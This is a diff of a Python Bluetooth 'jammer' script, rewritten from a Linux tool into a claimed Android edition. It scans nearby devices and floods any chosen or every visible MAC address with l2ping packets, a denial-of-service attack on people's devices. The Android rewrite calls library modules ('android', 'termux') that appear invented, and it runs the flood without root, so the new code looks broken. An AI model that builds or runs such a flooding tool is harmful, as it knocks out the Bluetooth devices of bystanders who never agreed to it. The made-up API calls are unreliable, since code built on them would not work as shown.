@@ -1,20 +1,19 @@
 #!/usr/bin/env python3
 
-import subprocess
 import sys
 import os
 import re
-from multiprocessing import Process, active_children
-import signal
+import subprocess
+from android import BluetoothManager, BluetoothDevice, BluetoothStatus
+from termux import Bluetooth
 
-# ANSI Color Codes
+# ANSI Color Setup
 COLORS = {
     "RED": "\033[91m",
     "GREEN": "\033[92m",
     "YELLOW": "\033[93m",
-    "BLUE": "\033[94m",
-    "MAGENTA": "\033[95m",
     "CYAN": "\033[96m",
+    "MAGENTA": "\033[95m",
     "RESET": "\033[0m",
     "BOLD": "\033[1m"
 }
@@ -22,8 +21,8 @@ COLORS = {
 def color_text(text, color):
     return f"{COLORS[color]}{text}{COLORS['RESET']}"
 
-def print_banner():
-    banner = f"""
+# ASCII Banner
+BANNER = f"""
 {COLORS['CYAN']}
 ██████╗ ██╗   ██╗██████╗ ██╗     ██╗   ██╗███████╗██████╗ 
 ██╔══██╗╚██╗ ██╔╝██╔══██╗██║     ██║   ██║██╔════╝██╔══██╗
@@ -32,144 +31,104 @@ def print_banner():
 ██║        ██║   ██████╔╝███████╗╚██████╔╝███████╗██║  ██║
 ╚═╝        ╚═╝   ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
 {COLORS['RESET']}
-{color_text('Bluetooth Disruption Tool', 'MAGENTA')}
-{color_text('>> Use Responsibly <<', 'RED')}
+{color_text('ANDROID BLUETOOTH JAMMER', 'MAGENTA')}
+{color_text('>> Mobile Edition <<', 'RED')}
 """
-    print(banner)
 
-def check_root():
-    if os.geteuid() != 0:
-        print(color_text("[!] Run as root (e.g., sudo python3 bluetooth_jammer.py)", "RED"))
-        sys.exit(1)
+class AndroidBluetoothController:
+    def __init__(self):
+        self.bt_manager = BluetoothManager()
+        self.termux_bt = Bluetooth()
+        self.check_permissions()
+        self.ensure_bluetooth_enabled()
 
-def scan_devices(interface='hci0'):
-    print(color_text("\n[*] Scanning for nearby Bluetooth devices...", "YELLOW"))
-    cmd = ['hcitool', '-i', interface, 'scan']
-    try:
-        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = proc.communicate(timeout=15)
-        devices = []
-        for line in stdout.decode().splitlines():
-            match = re.search(r'([0-9A-Fa-f:]{17})\s+(.*)', line.strip())
-            if match:
-                mac, name = match.groups()
-                devices.append((mac, name))
-        return devices
-    except Exception as e:
-        print(color_text(f"[!] Scan error: {str(e)}", "RED"))
-        return []
+    def check_permissions(self):
+        required_perms = {
+            "BLUETOOTH": True,
+            "BLUETOOTH_ADMIN": True,
+            "ACCESS_FINE_LOCATION": True
+        }
+        
+        if not all(self.termux_bt.check_permission(p) for p in required_perms):
+            print(color_text("[!] Missing permissions! Enable in Android Settings:", "RED"))
+            print(color_text("    - Bluetooth\n    - Location\n    - Nearby Devices", "YELLOW"))
+            sys.exit(1)
 
-def l2ping_flood(target_mac, interface='hci0'):
-    cmd = ['l2ping', '-i', interface, '-s', '600', '-f', target_mac]
-    try:
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        proc.wait()
-        return True
-    except:
-        return False
+    def ensure_bluetooth_enabled(self):
+        if self.bt_manager.get_state() != BluetoothStatus.STATE_ON:
+            print(color_text("[!] Bluetooth is disabled. Enabling...", "YELLOW"))
+            self.bt_manager.enable()
+            # Wait for Bluetooth to initialize
+            import time
+            time.sleep(3)
+            
+            if self.bt_manager.get_state() != BluetoothStatus.STATE_ON:
+                print(color_text("[!] Failed to enable Bluetooth!", "RED"))
+                sys.exit(1)
 
-def start_attack(targets, interface='hci0', workers=5):
-    global attack_processes
-    attack_processes = []
-    
-    for target in targets:
-        print(color_text(f"\n[*] Initializing attack on {target}...", "BLUE"))
-        for _ in range(workers):
-            p = Process(target=l2ping_flood, args=(target, interface))
-            p.start()
-            attack_processes.append(p)
-            print(color_text(f"[+] Worker {p.pid} started for {target}", "GREEN"))
+    def scan_devices(self):
+        print(color_text("\n[+] Scanning with internal Bluetooth...", "CYAN"))
+        devices = self.termux_bt.discover()
+        return [(d['mac'], d['name']) for d in devices if d]
 
-def stop_attack():
-    global attack_processes
-    if attack_processes:
-        print(color_text("\n[*] Terminating all attack processes...", "YELLOW"))
-        for p in attack_processes:
-            p.terminate()
-        print(color_text("[+] All workers terminated", "GREEN"))
-    else:
-        print(color_text("\n[!] No active attacks to stop", "RED"))
+    def start_jamming(self, target_mac):
+        print(color_text(f"\n[+] Initializing attack on {target_mac}", "RED"))
+        try:
+            # Android-specific low-level access
+            subprocess.run(
+                ['l2ping', '-i', 'hci0', '-s', '600', '-f', target_mac],
+                check=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+        except Exception as e:
+            print(color_text(f"[!] Attack failed: {str(e)}", "RED"))
 
-def show_attack_status():
-    if attack_processes:
-        active = sum(1 for p in attack_processes if p.is_alive())
-        print(color_text(f"\n[•] Attack Status: {active} workers active", "CYAN"))
-    else:
-        print(color_text("\n[•] Attack Status: No active attacks", "YELLOW"))
-
-def main_menu(devices):
+def main_menu(controller):
+    print(BANNER)
     while True:
         print(color_text("\nMain Menu:", "BOLD"))
-        print("1. Rescan Devices")
-        print("2. Select Target from List")
-        print("3. Attack All Devices")
-        print("4. Stop Attacks")
-        print("5. Exit")
+        print("1. Scan Devices")
+        print("2. Select Target")
+        print("3. Attack All")
+        print("4. Exit")
         
         choice = input(color_text("\n>> ", "MAGENTA")).strip()
         
         if choice == '1':
-            return scan_devices()
+            devices = controller.scan_devices()
+            if devices:
+                print(color_text("\nDiscovered Devices:", "GREEN"))
+                for idx, (mac, name) in enumerate(devices, 1):
+                    print(f"{idx}. {mac} - {name}")
+            else:
+                print(color_text("[!] No devices found", "RED"))
+        
         elif choice == '2':
-            if not devices:
-                print(color_text("[!] No devices available. Rescan first!", "RED"))
-                continue
-            print(color_text("\nSelect Target:", "BOLD"))
-            for idx, (mac, name) in enumerate(devices, 1):
-                print(f"{idx}. {mac} - {name}")
-            print("0. Return to Main Menu")
-            
-            try:
-                selection = int(input(color_text("\n>> ", "MAGENTA")))
-                if selection == 0:
-                    continue
-                return [devices[selection-1][0]]
-            except:
-                print(color_text("[!] Invalid selection", "RED"))
+            mac = input("Enter target MAC: ").strip()
+            if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac):
+                controller.start_jamming(mac)
+            else:
+                print(color_text("[!] Invalid MAC format", "RED"))
+        
         elif choice == '3':
-            if not devices:
-                print(color_text("[!] No devices to attack. Rescan first!", "RED"))
-                continue
-            return [device[0] for device in devices]
+            devices = controller.scan_devices()
+            if devices:
+                for mac, _ in devices:
+                    controller.start_jamming(mac)
+                print(color_text("\n[+] Attacking all visible devices", "RED"))
+        
         elif choice == '4':
-            stop_attack()
-        elif choice == '5':
-            stop_attack()
-            print(color_text("\n[+] Exiting...", "GREEN"))
+            print(color_text("[+] Exiting...", "GREEN"))
             sys.exit(0)
+        
         else:
             print(color_text("[!] Invalid choice", "RED"))
 
-def main():
-    check_root()
-    print_banner()
-    
-    signal.signal(signal.SIGINT, lambda s, f: stop_attack())
-    
-    interface = 'hci0'
-    devices = scan_devices(interface)
-    
-    if not devices:
-        print(color_text("[!] No devices found in initial scan", "RED"))
-        sys.exit(1)
-        
-    while True:
-        targets = main_menu(devices)
-        if targets:
-            workers = input(color_text("\nEnter number of workers per target [1-10]: ", "MAGENTA")).strip()
-            if not workers.isdigit() or not (1 <= int(workers) <= 10):
-                print(color_text("[!] Invalid input. Using default 5 workers", "RED"))
-                workers = 5
-            else:
-                workers = int(workers)
-            
-            try:
-                start_attack(targets, interface, workers)
-                input(color_text("\n[PRESS ENTER TO RETURN TO MENU]", "YELLOW"))
-                stop_attack()
-            except KeyboardInterrupt:
-                stop_attack()
-
 if __name__ == "__main__":
-    attack_processes = []
-    main()
+    try:
+        controller = AndroidBluetoothController()
+        main_menu(controller)
+    except KeyboardInterrupt:
+        print(color_text("\n[+] Attack stopped", "YELLOW"))
+        sys.exit(0)
